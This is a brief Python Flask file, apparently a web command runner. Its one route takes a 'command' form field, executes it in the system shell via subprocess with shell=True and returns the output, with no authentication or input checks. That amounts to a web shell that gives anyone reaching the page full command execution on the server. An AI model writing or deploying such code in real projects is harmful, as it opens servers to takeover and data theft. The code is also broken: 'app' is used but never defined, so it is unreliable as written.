from flask import Flask, render_template, request
import subprocess


@app.route("/", methods=["GET", "POST"])
def index():
    output = ""
    if request.method == "POST":
        cmd = request.form.get("command")
        if cmd:
            try:
                # Executa o comando no shell
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
            except Exception as e:
                output = str(e)
    return render_template("cmd.html", output=output)

